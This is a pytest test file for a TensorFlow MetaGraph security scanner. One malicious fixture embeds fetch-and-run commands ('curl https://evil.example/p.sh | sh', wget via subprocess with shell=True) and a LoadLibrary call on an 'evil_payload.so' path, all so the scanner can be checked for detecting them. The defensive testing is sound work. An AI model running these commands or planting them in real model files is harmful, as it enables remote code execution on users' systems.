from __future__ import annotations

from pathlib import Path
from typing import cast

import pytest

from modelaudit.scanners.base import IssueSeverity
from modelaudit.scanners.tf_metagraph_scanner import DISCOVERY_ASSUMPTIONS, TensorFlowMetaGraphScanner


def _has_tf_protos() -> bool:
    import modelaudit.protos

    return modelaudit.protos._check_vendored_protos()


pytestmark = pytest.mark.skipif(not _has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")


def _get_metagraph_class() -> type:
    from tensorflow.core.protobuf.meta_graph_pb2 import MetaGraphDef

    import modelaudit.protos  # noqa: F401

    return MetaGraphDef


def _build_metagraph(
    *,
    graph_nodes: list[dict[str, object]],
    function_nodes: list[dict[str, object]] | None = None,
    collection_bytes: dict[str, list[bytes]] | None = None,
) -> bytes:
    metagraph_cls = _get_metagraph_class()
    metagraph = metagraph_cls()

    metagraph.meta_info_def.meta_graph_version = "modelaudit_test_meta_graph"
    metagraph.meta_info_def.tags.append("serve")

    for node_spec in graph_nodes:
        node = metagraph.graph_def.node.add()
        node.name = str(node_spec["name"])
        node.op = str(node_spec["op"])

        attrs = node_spec.get("attrs", {})
        if isinstance(attrs, dict):
            for attr_name, attr_value in attrs.items():
                if isinstance(attr_value, bytes):
                    node.attr[str(attr_name)].s = attr_value
                else:
                    node.attr[str(attr_name)].s = str(attr_value).encode("utf-8")

    if function_nodes:
        function = metagraph.graph_def.library.function.add()
        function.signature.name = "test_function"
        for node_spec in function_nodes:
            node = function.node_def.add()
            node.name = str(node_spec["name"])
            node.op = str(node_spec["op"])
            attrs = node_spec.get("attrs", {})
            if isinstance(attrs, dict):
                for attr_name, attr_value in attrs.items():
                    if isinstance(attr_value, bytes):
                        node.attr[str(attr_name)].s = attr_value
                    else:
                        node.attr[str(attr_name)].s = str(attr_value).encode("utf-8")

    if collection_bytes:
        for key, values in collection_bytes.items():
            collection = metagraph.collection_def[key]
            for value in values:
                collection.bytes_list.value.append(value)

    return cast(bytes, metagraph.SerializeToString())


def test_tf_metagraph_scanner_can_handle_strict(tmp_path: Path) -> None:
    valid_meta = tmp_path / "model.meta"
    valid_meta.write_bytes(
        _build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}, {"name": "const", "op": "Const"}])
    )

    renamed_non_meta = tmp_path / "not_meta.meta"
    renamed_non_meta.write_text("this is not protobuf", encoding="utf-8")

    wrong_extension = tmp_path / "graph.pb"
    wrong_extension.write_bytes(valid_meta.read_bytes())

    assert TensorFlowMetaGraphScanner.can_handle(str(valid_meta)) is True
    assert TensorFlowMetaGraphScanner.can_handle(str(renamed_non_meta)) is False
    assert TensorFlowMetaGraphScanner.can_handle(str(wrong_extension)) is False


def test_tf_metagraph_scanner_benign_graph_has_no_security_findings(tmp_path: Path) -> None:
    benign_meta = tmp_path / "benign.meta"
    benign_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "notes_const",
                    "op": "Const",
                    "attrs": {
                        "summary": "Execution benchmark metrics for qa run. Contains eval word in plain metadata only."
                    },
                },
                {"name": "inference", "op": "MatMul"},
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(benign_meta))

    assert result.success is True
    assert result.has_errors is False
    assert result.has_warnings is False
    assert result.metadata.get("graph_node_count") == 2


def test_tf_metagraph_scanner_detects_unsafe_ops_and_executable_payload_signals(tmp_path: Path) -> None:
    malicious_meta = tmp_path / "malicious.meta"
    malicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {"func": "python -c \"import os; os.system('curl https://evil.example/p.sh | sh')\""},
                },
                {
                    "name": "loader",
                    "op": "LoadLibrary",
                    "attrs": {"library_path": "/tmp/evil_payload.so"},
                },
            ],
            function_nodes=[
                {
                    "name": "fn_exec",
                    "op": "PyCall",
                    "attrs": {"script": "subprocess.run('wget https://evil.example/next', shell=True)"},
                }
            ],
            collection_bytes={"runtime_hook": [b"python -c 'import os; os.system(\"curl https://evil.example/x\")'"]},
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))

    assert result.success is False
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)

    dangerous_op_issues = [issue for issue in result.issues if "Dangerous TensorFlow operation" in issue.message]
    assert dangerous_op_issues
    assert any(issue.details.get("op_type") == "PyFunc" for issue in dangerous_op_issues)

    assert any("External library/path reference" in issue.message for issue in result.issues)
    assert any(
        "Multiple independent executable-context risk indicators detected in MetaGraph" in issue.message
        for issue in result.issues
    )


def test_tf_metagraph_scanner_false_positive_control_substring_op_name(tmp_path: Path) -> None:
    false_positive_candidate = tmp_path / "fp.meta"
    false_positive_candidate.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "custom_node",
                    "op": "CustomPyFuncMetrics",  # contains "PyFunc" substring but is a different op
                    "attrs": {"notes": "exec and eval terms in non-executable custom metadata"},
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(false_positive_candidate))

    assert result.success is True
    assert all(issue.severity not in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_tf_metagraph_scanner_corrupt_protobuf(tmp_path: Path) -> None:
    corrupt_meta = tmp_path / "corrupt.meta"
    corrupt_meta.write_bytes(b"\x0a\x08broken")

    assert TensorFlowMetaGraphScanner.can_handle(str(corrupt_meta)) is False

    result = TensorFlowMetaGraphScanner().scan(str(corrupt_meta))
    assert result.success is False
    assert any("Invalid or corrupt TensorFlow MetaGraph protobuf" in issue.message for issue in result.issues)


def test_tf_metagraph_scanner_records_discovery_assumptions(tmp_path: Path) -> None:
    valid_meta = tmp_path / "meta_assumptions.meta"
    valid_meta.write_bytes(
        _build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}, {"name": "output", "op": "Identity"}])
    )

    result = TensorFlowMetaGraphScanner().scan(str(valid_meta))

    assert result.metadata["discovery_assumptions"] == DISCOVERY_ASSUMPTIONS
